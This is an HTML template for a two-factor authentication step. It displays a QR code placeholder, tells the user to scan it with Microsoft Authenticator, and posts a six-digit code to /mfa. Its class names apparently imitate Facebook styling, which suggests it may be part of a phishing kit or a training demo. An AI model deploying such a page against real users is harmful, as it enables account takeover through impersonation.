<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MFA Verification</title>
    <link rel="stylesheet" href="/styles.css" />
  </head>
  <body class="facebook-page">
    <div class="facebook-shell">
      <div class="auth-panel">
        <form class="facebook-form" action="/mfa" method="POST">
          <div class="badge">Step 2 of 2</div>
          <h1>Two-factor authentication</h1>
          <p class="subtitle">Open Microsoft Authenticator and scan the QR code, then enter the 6-digit code.</p>

          <div class="qr-wrap">
            <img src="{{qrCode}}" alt="Authenticator QR code" />
          </div>

          <input id="code" name="code" type="text" maxlength="6" placeholder="123456" required />
          <button type="submit">Verify</button>
        </form>
      </div>
    </div>
  </body>
</html>
